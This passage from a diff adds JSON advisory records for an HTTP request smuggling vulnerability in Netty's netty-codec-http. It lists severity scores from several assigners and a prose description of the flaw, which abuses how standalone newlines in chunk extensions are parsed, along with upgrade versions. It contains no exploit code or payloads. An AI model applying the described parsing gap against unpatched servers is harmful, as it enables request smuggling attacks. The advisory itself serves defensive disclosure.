+            "assigner": "NVD",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+            "cvssV3BaseScore": 7.5,
+            "modificationTime": "2025-09-09T01:13:32.250225Z"
+          },
+          {
+            "assigner": "Red Hat",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+            "cvssV3BaseScore": 7.5,
+            "modificationTime": "2025-09-10T16:19:01.054437Z"
+          },
+          {
+            "assigner": "SUSE",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+            "cvssV3BaseScore": 7.5,
+            "modificationTime": "2025-09-10T16:09:13.804610Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 8.7,
+            "cvssVersion": "4.0",
+            "modificationTime": "2025-09-04T10:03:23.431241Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N/E:P",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-09-04T10:03:23.431241Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+            "assigner": "NVD",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-09-09T01:13:32.250225Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+            "assigner": "Red Hat",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-09-10T16:19:01.054437Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+            "assigner": "SUSE",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-09-10T16:09:13.804610Z"
+          }
+        ],
+        "description": "## Overview\n[io.netty:netty-codec-http](https://mvnrepository.com/artifact/io.netty/netty-codec-http) is a network application framework for rapid development of maintainable high performance protocol servers & clients.\n\nAffected versions of this package are vulnerable to HTTP Request Smuggling via the parsing of chunk extensions in HTTP/1.1 messages with chunked encoding. An attacker can bypass HTTP request boundaries by sending specially crafted HTTP requests that exploit differences in how standalone newline characters are parsed between reverse proxies and the backend, potentially allowing them to smuggle additional requests.\n## Remediation\nUpgrade `io.netty:netty-codec-http` to version 4.1.125.Final, 4.2.5.Final or higher.\n## References\n- [GitHub Commit
